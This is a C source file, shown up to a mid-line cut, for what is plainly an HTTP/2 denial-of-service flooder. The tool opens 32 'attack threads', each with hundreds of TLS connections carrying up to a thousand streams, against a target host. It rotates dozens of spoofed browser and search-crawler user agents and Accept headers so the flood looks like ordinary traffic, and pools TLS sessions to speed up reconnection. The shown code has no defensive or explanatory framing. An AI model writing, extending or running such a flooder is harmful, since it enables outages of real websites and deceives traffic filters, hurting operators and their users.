#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>
#include <assert.h>
#include <errno.h>
#include <stdatomic.h>
#include <stddef.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <nghttp2/nghttp2.h>

#define NUM_ATTACK_THREADS 32
#define CONCURRENT_CONNECTIONS_PER_THREAD 512
#define MAX_CONCURRENT_STREAMS_PER_CONNECTION 1000
#define CONNECTION_TIMEOUT_NS 5000000000L

#define C_RESET "\x1b[0m"
#define C_GREEN "\x1b[32m"
#define C_BOLD  "\x1b[1m"

static const char* user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.82 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4896.88 Safari/537.36",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
};

static const char* accepts[] = {
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/webp,image/apng,image/*,*/*;q=0.8",
    "application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/css,*/*;q=0.1",
    "application/javascript, */*;q=0.8",
    "application/xml",
    "text/plain",
    "application/json",
    "text/xml",
    "application/x-javascript",
    "text/javascript",
    "application/ld+json",
    "application/rss+xml",
    "application/atom+xml",
    "image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
    "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5",
    "audio/webm,audio/ogg,audio/wav,audio/*;q=0.9,application/ogg;q=0.7,video/*;q=0.6;*/*;q=0.5",
    "application/pdf,application/postscript,*/*;q=0.8",
    "application/octet-stream",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/event-stream",
    "application/vnd.api+json",
    "application/hal+json",
    "application/vnd.collection+json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "application/json;charset=UTF-8",
    "text/html;charset=UTF-8",
    "application/x-protobuf",
    "application/grpc",
    "application/msgpack"
};

typedef enum { CONN_STATE_DISCONNECTED, CONN_STATE_CONNECTING, CONN_STATE_HANDSHAKING, CONN_STATE_CONNECTED } connection_state;
typedef struct connection_s { int fd; SSL *ssl; nghttp2_session *ngh2_session; int thread_id; int epoll_fd; struct timespec last_activity; connection_state state; uint32_t stream_counter; } connection_t;

typedef struct {
    int thread_id;
    unsigned int rand_seed;
    const char* user_agent;
    size_t user_agent_len;
    const char* accept_header;
    size_t accept_header_len;
    char path_with_query[2048];
    size_t base_path_len;
    char origin_header[512];
    size_t origin_header_len;
    char referer_header[1024];
    size_t referer_header_len;
} thread_context_t;

thread_context_t contexts[NUM_ATTACK_THREADS];
struct sockaddr_storage g_remote_addr;
SSL_CTX *g_ssl_ctx;
char g_target_host[256];
char g_target_path[1024];
static pthread_mutex_t *ssl_locks;

#define SESSION_POOL_SIZE 64
_Atomic(SSL_SESSION*) g_session_pool[SESSION_POOL_SIZE];
atomic_uint g_session_pool_idx = 0;

static void submit_new_request(connection_t *conn);
static void reset_connection(connection_t *conn);
static void do_handshake(connection_t *conn);
void locking_callback(int mode, int n, const char *file, int line) { if (mode & CRYPTO_LOCK) pthread_mutex_lock(&ssl_locks[n]); else pthread_mutex_unlock(&ssl_locks[n]); }
unsigned long thread_id_callback(void) { return (unsigned long)pthread_self(); }

int new_session_cb(SSL *ssl, SSL_SESSION *session) {
    unsigned int idx = atomic_fetch_add_explicit(&g_session_pool_idx, 1, memory_order_relaxed) % SESSION_POOL_SIZE;
    SSL_SESSION *new_sess = SSL_SESSION_dup(session);
    if (!new_sess) return 0;
    SSL_SESSION *old_sess = atomic_exchange_explicit(&g_session_pool[idx], new_sess, memory_order_relaxed);
    if (old_sess) SSL_SESSION_free(old_sess);
    return 1;
}

ssize_t send_callback(nghttp2_session *session, const uint8_t *data, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_write(conn->ssl, data, length);
    if (rv <= 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) return NGHTTP2_ERR_WOULDBLOCK; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    return rv;
}

ssize_t recv_callback(nghttp2_session *session, uint8_t *buf, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_read(conn->ssl, buf, length);
    if (rv < 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) return NGHTTP2_ERR_WOULDBLOCK; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    if (rv == 0) return NGHTTP2_ERR_EOF;
    return rv;
}

int on_stream_close_callback(nghttp2_ses
